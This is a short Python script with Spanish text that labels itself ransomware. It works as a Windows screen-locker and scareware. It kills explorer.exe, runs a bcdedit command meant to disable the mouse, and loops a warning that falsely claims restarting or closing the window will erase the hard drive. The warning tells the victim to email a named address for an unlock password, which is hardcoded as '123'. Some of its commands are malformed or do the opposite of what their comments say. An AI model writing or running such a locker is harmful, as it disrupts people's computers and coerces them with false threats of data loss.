import ctypes
import os

# Configuración inicial
os.system("color 0A")
os.system("title ESTO ES UN RANSOMWARE")
os.system("taskkill /f /im explorer.exe")
os.system("mode con: cols=800 lines=65")

# Bloquea la pantalla
#ctypes.windll.user32.LockWorkStation()
# bloquea el mouse 
os.system("bcdedit /set disablemou true")

while True:
    os.system("cls")
    print("=============================================")
    print("               LEE CON ATENCION!.")
    print("=============================================")
    print("NO REINICIAR LA COMPUTADORA!")
    print("AL REINICIAR SE ELIMINARA TODOS LOS DATOS DEL DISCO DURO!")
    print("SI USTED CIERRA ESTA VENTANA NO PODRA RECUPERAR SU COMPUTADORA!")
    print("ESCRIBIR A jmgonzalez823@misena.edu.co")
    print("=============================================")
    password = input("Ingresar el password que recibió por correo: ")
    if password == "123":
        print("Felicidades!")
        os.system("start explorer.exe")
        # Desbloquea la pantalla
        ctypes.windll.user32.LockWorkStation()
